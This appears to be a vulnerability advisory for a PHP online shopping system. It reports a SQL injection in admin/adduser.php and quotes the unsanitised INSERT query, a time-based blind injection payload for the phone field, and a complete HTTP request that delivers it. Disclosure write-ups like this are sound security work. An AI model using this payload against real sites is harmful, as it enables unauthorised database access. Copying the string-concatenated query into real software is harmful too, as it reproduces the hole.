## ONLINE SHOPPING SYSTEM admin/adduser.php SQL Injection Vulnerability

### I. Vulnerability Impact

An attacker with admin access can exploit this vulnerability to inject malicious SQL through the user creation form, enabling data extraction from the database via error-based or time-based blind injection. Combined with session hijacking, this can lead to full database compromise.

### II. Source Code Analysis

The vulnerability resides in `admin/adduser.php`, line 18:

```php
mysqli_query($con,"insert into user_info(first_name, last_name,email,password,mobile,address1,address2) 
    values ('$first_name','$last_name','$email','$user_password','$mobile','$address1','$address2')") 
    or die ("Query 1 is inncorrect........");
```

All seven parameters (`first_name`, `last_name`, `email`, `password`, `mobile`, `address1`, `address2`) are taken directly from `$_POST` without any filtering and concatenated into the INSERT statement. The `$mobile` parameter (`phone` field) in particular is vulnerable to SQL injection via the same technique used in other endpoints.

### III. Payload

The core injection payload targeting the `phone` parameter:

```
123123'and(select*from(select+sleep(10))a/**/union/**/select+1)='
```

After injection, the actual executed SQL becomes:

```sql
insert into user_info(...) values ('1','1','1@qq.com','11','123123'and(select*from(select+sleep(10))a/**/union/**/select+1)='','1','1')
```

HTTP request:

```
POST /admin/adduser.php HTTP/1.1
Host: onlineshop
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryHe9lEZ9i8GyyWBBh
Cookie: PHPSESSID=ol422um54c9e387qhla8o63ril

------WebKitFormBoundaryHe9lEZ9i8GyyWBBh
Content-Disposition: form-data; name="phone"

123123'and(select*from(select+sleep(10))a/**/union/**/select+1)='
------WebKitFormBoundaryHe9lEZ9i8GyyWBBh--
```

### IV. Source Download

https://code-projects.org/online-shopping-system-in-php-with-source-code/



![image-20260627112738115](https://raw.githubusercontent.com/zzzxc643/images/main/image/image-20260627112738115.png)